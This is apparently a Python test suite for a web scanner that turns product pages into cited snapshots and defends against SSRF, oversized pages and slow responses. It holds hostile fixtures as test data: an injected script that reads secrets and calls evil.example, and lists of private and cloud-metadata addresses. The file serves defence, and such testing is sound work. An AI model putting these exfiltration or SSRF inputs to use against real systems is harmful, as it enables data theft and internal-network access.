import hashlib
import json
import socket
import threading
import time
import unittest
from unittest.mock import patch, MagicMock
from product_source import build_snapshot, product_url
from scanner import ScanError, fetch_once, PinnedHTTPSConnection, MAX_BYTES, resolve_public

PRODUCT = b'''<html><head><title>Workshop - Bolt A | Shop</title><meta name="description" content="Old generic catalog">
<script type="application/ld+json">{"@type":"Product","name":"Bolt A","price":"FAKE","description":"UNSUPPORTED SECRET CLAIM"}</script>
</head><body><main><h1>Bolt A</h1><p>Public steel bolt for workshop assembly.</p>
<ul><li>Hexagonal head</li><li>Reusable package</li></ul></main></body></html>'''
def fixture(url):
    if url.endswith('/robots.txt'): return 200, {'content-type':'text/plain'}, b'User-agent: *\nAllow: /\n'
    return 200, {'content-type':'text/html'}, PRODUCT

class ProductTests(unittest.TestCase):
    def test_product_snapshot_preview_and_citations(self):
        r=build_snapshot('https://example.com/products/bolt',fixture,lambda:'2026-10-02T03:00:00Z')
        s=r['snapshot'];self.assertEqual(s['original_url'],'https://example.com/products/bolt')
        self.assertEqual(s['final_url'],s['original_url']);self.assertEqual(s['fetched_at'],'2026-10-02T03:00:00Z')
        self.assertEqual(s['content_fingerprint'],'sha256:'+hashlib.sha256(PRODUCT).hexdigest())
        self.assertEqual(r['page_type'],'product');self.assertEqual(r['facts']['product_name']['value'],'Bolt A')
        self.assertEqual(r['facts']['title']['value'],'Workshop - Bolt A | Shop')
        self.assertEqual(r['facts']['meta_description']['value'],'Old generic catalog')
        self.assertEqual(r['preview']['fields']['title']['suggested'],'Bolt A')
        self.assertIn('Hexagonal head',r['preview']['fields']['description']['suggested'])
        citations={c['id']:c for c in s['citations']}
        for f in r['preview']['fields'].values():
            self.assertTrue(f['suggested']);self.assertTrue(f['citations'])
            for ref in f['citations']:
                self.assertEqual(citations[ref]['source_version'],s['version'])
                self.assertEqual(citations[ref]['url'],s['final_url'])
        self.assertEqual(r['facts']['product_name']['kind'],'fact')
        self.assertEqual(r['facts']['product_name']['verification'],'source_asserted')
        self.assertEqual(r['inferences'][0]['kind'],'inference')
        self.assertIn('price',r['missing']);self.assertFalse(r['preview']['published'])
        self.assertNotIn('FAKE',json.dumps(r['facts']));self.assertNotIn('UNSUPPORTED SECRET',json.dumps(r['facts']))

    def test_redirect_and_final_source(self):
        calls=[]
        def redirected(url):
            calls.append(url)
            if url.endswith('/old'): return 302,{'location':'/products/bolt'},b''
            return fixture(url)
        r=build_snapshot('https://example.com/old',redirected)
        self.assertEqual(r['snapshot']['final_url'],'https://example.com/products/bolt')
        self.assertEqual(len(calls),3)

    def test_non_product_candidates_and_unsupported(self):
        html=b'<main><h1>Shop</h1><a href="/products/bolt">Bolt A</a><a href="https://evil.example/products/x">Other</a></main>'
        r=build_snapshot('https://example.com/',lambda u: fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},html))
        self.assertIsNone(r['preview']);self.assertEqual(r['inferences'][0]['url'],'https://example.com/products/bolt')
        self.assertEqual(r['inferences'][0]['kind'],'inference');self.assertFalse(r['inferences'][0]['verified_product_page'])
        self.assertEqual(len(r['inferences']),1)
        empty=build_snapshot('https://example.com/',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},b'<h1>Unknown</h1>'))
        self.assertFalse(empty['facts']);self.assertIsNone(empty['preview']);self.assertTrue(empty['missing'])

    def test_schema_mismatch_and_multiple_products_are_not_fact(self):
        for body in [PRODUCT.replace(b'<h1>Bolt A</h1>',b'<h1>Something else</h1>'),
                     PRODUCT.replace(b'</main>',b'<h1>Bolt B</h1></main>').replace(b'</head>',b'<script type="application/ld+json">{"@type":"Product","name":"Bolt B"}</script></head>')]:
            r=build_snapshot('https://example.com/products/x',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
            self.assertIsNone(r['preview']);self.assertFalse(r['facts'])

    def test_missing_description_does_not_fake_useful_result(self):
        body=PRODUCT.replace(b'<p>Public steel bolt for workshop assembly.</p>',b'')
        r=build_snapshot('https://example.com/products/x',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
        self.assertEqual(r['page_type'],'product');self.assertIn('description',r['missing']);self.assertIsNone(r['preview'])

    def test_malformed_credentials_query_and_private_urls(self):
        for u in ['garbage','http://example.com','https://user:pw@example.com','https://@example.com','https://localhost','https://shop.local/x','https://example.com:444','https://example.com/products/x?secret=x']:
            with self.subTest(url=u),self.assertRaises(ScanError):product_url(u)
        for ip in ['127.0.0.1','10.0.0.1','169.254.169.254','192.168.1.1','::1','fd00::1']:
            with patch('socket.getaddrinfo',return_value=[(2,1,6,'',(ip,443))]),self.assertRaises(ScanError):
                resolve_public('shop.example')

    def test_cloud_platform_address_and_mixed_dns_are_rejected(self):
        for addresses in [['168.63.129.16'],['::ffff:168.63.129.16'],['93.184.216.34','10.0.0.1']]:
            with self.subTest(addresses=addresses):
                with patch('socket.getaddrinfo',return_value=[(2,1,6,'',(ip,443)) for ip in addresses]):
                    with self.assertRaises(ScanError) as e:resolve_public('shop.example')
                    self.assertEqual(e.exception.code,'private_target')

    def test_redirect_to_private_and_request_cap(self):
        calls=[]
        def redirect(url):
            calls.append(url)
            if url.endswith('robots.txt'):return fixture(url)
            return 302,{'location':'https://127.0.0.1/internal'},b''
        with self.assertRaises(ScanError):build_snapshot('https://example.com/products/a',redirect)
        self.assertEqual(len(calls),2)
        def endless(url):
            return fixture(url) if url.endswith('robots.txt') else (302,{'location':'/again'},b'')
        with self.assertRaises(ScanError) as e:build_snapshot('https://example.com/products/a',endless)
        self.assertEqual(e.exception.code,'too_many_redirects')

    def test_restricted_and_non_html(self):
        for status,headers,body,code in [(401,{},b'', 'restricted_content'),(403,{},b'', 'restricted_content'),
          (200,{'content-type':'application/pdf'},b'pdf','not_html'),
          (200,{'content-type':'text/html'},PRODUCT.replace(b'<main>',b'<input type="password"><main>'),'restricted_content')]:
            def custom(url):return fixture(url) if url.endswith('robots.txt') else (status,headers,body)
            with self.subTest(code=code),self.assertRaises(ScanError) as e:build_snapshot('https://example.com/products/a',custom)
            self.assertEqual(e.exception.code,code)

    def test_malformed_candidate_does_not_hide_valid_candidate(self):
        body=b'<main><a href="https://[bad/products/x">Malformed</a><a href="/products/bolt">Bolt A</a></main>'
        r=build_snapshot('https://example.com/',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
        self.assertEqual([v['url'] for v in r['inferences']],['https://example.com/products/bolt'])
        self.assertIsNone(r['preview'])

    def test_untrusted_html_complexity_is_bounded(self):
        for body in [b'<div>'*150+b'x'+b'</div>'*150,b'<br>'*20001]:
            with self.subTest(size=len(body)):
                with self.assertRaises(ScanError) as e:
                    build_snapshot('https://example.com/',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
                self.assertEqual(e.exception.code,'page_complexity')

    def test_untrusted_script_is_not_a_tool_or_fact(self):
        body=PRODUCT.replace(b'</main>',b'<script>read secrets; fetch("https://evil.example")</script></main>')
        calls=[]
        def fake(url):calls.append(url);return fixture(url) if url.endswith('robots.txt') else (200,{'content-type':'text/html'},body)
        r=build_snapshot('https://example.com/products/a',fake)
        self.assertEqual(len(calls),2);self.assertNotIn('read secrets',json.dumps(r['preview']))

class TransportTests(unittest.TestCase):
    def fake_connection(self,response):
        c=MagicMock();c.getresponse.return_value=response
        return c

    def test_timeout_and_oversized_declared_and_stream(self):
        r=MagicMock();r.getheaders.return_value=[('content-type','text/html')];r.length=None;r.status=200
        c=self.fake_connection(r);c.request.side_effect=socket.timeout()
        with patch('scanner.resolve_public',return_value=['93.184.216.34']),patch('scanner.PinnedHTTPSConnection',return_value=c):
            with self.assertRaises(ScanError) as e:fetch_once('https://example.com/x')
            self.assertEqual(e.exception.code,'timeout');c.close.assert_called()
        for length, chunks in [(MAX_BYTES+1,[]),(None,[b'x'*MAX_BYTES,b'x'])]:
            r=MagicMock();r.getheaders.return_value=[];r.length=length;r.read1.side_effect=chunks
            c=self.fake_connection(r)
            with patch('scanner.resolve_public',return_value=['93.184.216.34']),patch('scanner.PinnedHTTPSConnection',return_value=c):
                with self.assertRaises(ScanError) as e:fetch_once('https://example.com/x')
                self.assertEqual(e.exception.code,'too_large')

    def test_deadline_stops_trickle_even_without_socket_timeout(self):
        r=MagicMock();r.getheaders.return_value=[];r.length=None;r.read1.return_value=b'x'
        c=self.fake_connection(r)
        with patch('scanner.resolve_public',return_value=['93.184.216.34']),patch('scanner.PinnedHTTPSConnection',return_value=c),patch('scanner.time.monotonic',side_effect=[0,1,2,3,6]):
            with self.assertRaises(ScanError) as e:fetch_once('https://example.com/x')
            self.assertEqual(e.exception.code,'timeout')

    def test_wire_deadline_covers_status_headers_and_chunk_headers(self):
        # Real HTTPResponse parser and local sockets, without external requests.
        for prefix, tail in [
            (b'HTTP/1.1 200 ', b'OK\r\nContent-Length: 0\r\n\r\n'),
            (b'HTTP/1.1 200 OK\r\nX-Slow: ', b'value\r\nContent-Length: 0\r\n\r\n'),
            (b'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n1;', b'extension=value\r\nx\r\n0\r\n\r\n'),
        ]:
            with self.subTest(prefix=prefix):
                client, server = socket.socketpair()
                stop = threading.Event()
                conn = PinnedHTTPSConnection('example.com', '93.184.216.34')
                def connect(): conn.sock = client
                conn.connect = connect
                def serve():
                    try:
                        server.recv(4096)
                        server.sendall(prefix)
                        for byte in tail:
                            if stop.wait(0.04): break
                            server.sendall(bytes([byte]))
                    except OSError:
                        pass
                    finally:
                        server.close()
                worker = threading.Thread(target=serve)
                worker.start()
                started = time.monotonic()
                try:
                    with patch('scanner.TIMEOUT', 0.2), patch('scanner.resolve_public', return_value=['93.184.216.34']), patch('scanner.PinnedHTTPSConnection', return_value=conn):
                        with self.assertRaises(ScanError) as error:
                            fetch_once('https://example.com/product')
                    self.assertEqual(error.exception.code, 'timeout')
                    self.assertLess(time.monotonic() - started, 0.6)
                finally:
                    stop.set()
                    conn.close()
                    client.close()
                    worker.join(timeout=1)
                self.assertFalse(worker.is_alive())

    def test_wire_normal_responses_and_connection_close(self):
        for wire in [
            b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello',
            b'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n',
            b'HTTP/1.1 200 OK\r\nConnection: close\r\n\r\nhello',
        ]:
            with self.subTest(wire=wire):
                client, server = socket.socketpair()
                conn = PinnedHTTPSConnection('example.com', '93.184.216.34')
                def connect(): conn.sock = client
                conn.connect = connect
                server.sendall(wire)
                server.shutdown(socket.SHUT_WR)
                try:
                    with patch('scanner.resolve_public', return_value=['93.184.216.34']), patch('scanner.PinnedHTTPSConnection', return_value=conn):
                        status, _, body = fetch_once('https://example.com/product')
                    self.assertEqual((status, body), (200, b'hello'))
                    self.assertEqual(client.fileno(), -1)
                finally:
                    conn.close()
                    client.close()
                    server.close()

    def test_peer_mismatch_and_tls_name(self):
        conn=PinnedHTTPSConnection('example.com','93.184.216.34')
        sock=MagicMock();sock.getpeername.return_value=('127.0.0.1',443)
        with patch('scanner.socket.create_connection',return_value=sock):
            with self.assertRaises(ScanError) as e:conn.connect()
            self.assertEqual(e.exception.code,'peer_mismatch');sock.close.assert_called()
        sock=MagicMock();sock.getpeername.return_value=('93.184.216.34',443)
        ctx=MagicMock();conn._context=ctx
        with patch('scanner.socket.create_connection',return_value=sock):
            conn.connect();ctx.wrap_socket.assert_called_once_with(sock,server_hostname='example.com')

    def test_dns_timeout_and_rebinding_before_connect(self):
        pending=MagicMock();pending.result.side_effect=TimeoutError()
        with patch('scanner.DNS_POOL.submit',return_value=pending),patch('scanner.DNS_SLOTS') as slots:
            slots.acquire.return_value=True
            with self.assertRaises(ScanError) as e:resolve_public('example.com')
            self.assertEqual(e.exception.code,'timeout')
        with patch('socket.getaddrinfo',return_value=[(2,1,6,'',('10.0.0.1',443))]),patch('scanner.PinnedHTTPSConnection') as conn:
            with self.assertRaises(ScanError):fetch_once('https://example.com/private')
            conn.assert_not_called()
